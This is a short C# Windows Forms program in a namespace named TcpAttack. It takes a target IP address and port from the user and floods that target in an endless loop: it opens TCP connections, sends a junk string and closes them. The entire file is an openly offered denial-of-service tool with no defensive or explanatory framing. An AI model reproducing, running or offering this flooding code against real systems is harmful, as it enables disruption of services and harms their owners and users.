using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace TcpAttack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Start(object sender, EventArgs e)
        {
            TcpFlood(textBox1.Text, int.Parse(textBox2.Text));
        }
        void TcpFlood(string ip, int port)
        {
            while (true)
            {
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(ip), port);
                Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sender.Connect(remoteEP);
                byte[] msg = Encoding.ASCII.GetBytes("kjafnhkşjagiagkagmaşdg");
                int bytesSend = sender.Send(msg);
                sender.Disconnect(true);
                sender.Close();
            }
        }
    }
}
